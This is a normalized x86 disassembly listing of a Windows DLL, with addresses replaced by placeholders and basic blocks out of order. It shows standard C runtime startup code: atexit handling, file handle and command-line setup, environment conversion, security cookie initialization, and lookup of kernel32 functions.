push 0xffffffff
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
push [ esi ]
call sub_10003622
pop ecx
add esi 0x4
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_10003622
pop ecx
mov [ rw-data ] ebx
push edi
call sub_10003622
pop ecx
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
pop ebx
test eax eax
jne r-xdata
push eax
call sub_10003622
pop ecx
mov [ rw-data ] ebx
pop edi
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_10003622
pop ecx
mov [ rw-data ] esi
sub_10003956
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_10005ddb
push r--data
push r--data
call sub_10003a4f
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_10005bb0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_10004727
call sub_10005dc6
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_10005bb0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_100039fb
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_10003615
push esi
call sub_10005adf
push esi
call sub_10005e3f
push esi
call sub_10005e4c
push esi
call sub_10005e66
push esi
call sub_10005e2e
add esp 0x18
pop esi
jmp sub_100043be
sub_10003a33
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_10003a4f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10003a83
push 0x1c
push r--data
call sub_10004750
push 0x8
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003b9d
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10004795
retn
mov [ rw-data ] 0x1
push 0x8
call sub_10004ab1
pop ecx
push [ ebp + 0x8 ]
call sub_10003805
push r--data
push r--data
call sub_10003a33
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_10003a33
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_10003bcf
push 0x64
push r--data
call sub_10004750
push 0xb
call sub_1000494d
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_10004628
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10006080
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_10004795
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003e74
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_10004628
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_10003e7d
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
cmp edi eax
jae r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call sub_10003622
and [ esi ] 0x0
pop ecx
add edi 0xc
mov ecx [ esi ]
add edi 0x40
add ecx 0x800
lea eax [ edi - 0xc ]
cmp eax ecx
jb r-xdata
push edi
call [ DeleteCriticalSection@IAT ]
cmp [ edi - 0x4 ] 0x0
je r-xdata
sub_10003ecf
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
push 0x104
mov edi rw-data
xor ebx ebx
push edi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] edi
test esi esi
je r-xdata
call sub_10004e12
mov esi edi
cmp [ esi ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0xffffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push esi
call sub_10003f80
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea edx [ ecx + ebx * 4 ]
cmp edx ecx
jb r-xdata
push edx
call sub_10004672
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_10003f80
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10003f80
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
and [ ebx ] 0x0
mov esi [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
xor eax eax
test ecx ecx
sete al
inc esi
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov al 0x22
jmp r-xdata
mov al [ esi ]
mov [ ebp + 0x1b ] al
movzx eax al
push eax
inc esi
call sub_10006398
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test ecx ecx
jne r-xdata
mov al [ ebp + 0x1b ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov ecx [ ebp + 0x8 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test edx edx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
and [ ebp + 0x18 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
pop ebp
retn
and [ edx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ edx ] edi
add edx 0x4
mov [ ebp + 0xc ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test cl 0x1
jne r-xdata
dec ecx
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp + 0x18 ] ecx
jne r-xdata
xor eax eax
xor edx edx
cmp [ ebp + 0x18 ] eax
sete al
mov [ ebp + 0x18 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
call sub_10006398
pop ecx
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebx ]
inc esi
inc [ ebx ]
mov al [ esi ]
mov [ edi ] al
inc edi
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
inc [ ebx ]
sub_100040fc
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10004e12
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_10004628
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_100058a0
inc esi
pop ecx
add esi eax
inc edi
mov esi [ rw-data ]
push ebx
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_10003622
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_100058a0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
add esi ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x1
push ebx
call sub_10004628
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_10003622
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1000583d
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10005b27
int3
add edi 0x4
sub_100041dd
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_10004277
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
push esi
mov esi edi
cmp [ edi ] ax
je r-xdata
push ebx
push eax
push eax
push eax
sub esi edi
push eax
sar esi 0x1
inc esi
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_10004672
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push ebx
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebx
call sub_10003622
pop ecx
xor ebx ebx
pop ebx
pop esi
sub_1000435e
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_10004380
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_100043be
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_10004628
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10006459
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10004672
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_1000355d
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_100046bb
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100063ae
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10004707
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_10004727
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_10004750
push sub_100047b0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_100047b0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002de0
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002de0
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_100061bb
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_10002de0
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002de0
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_10006172
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_100061a2
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_100061bb
mov eax [ ebp + 0xc ]
push rw-data
call sub_10005bb0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002de0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_10006189
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002de0
sub_1000494d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_100049d5
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1000392b
sub_10004981
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_10003622
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_100049d5
push 0x8
push r--data
call sub_10004750
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_1000559d
push 0x1e
call sub_100055fa
push 0xff
call sub_10003805
xor eax eax
inc eax
push 0x18
call sub_10004672
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_100057e9
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_10003622
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_10004795
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10004a73
sub_10004a7c
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_10004ac6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_10004b56
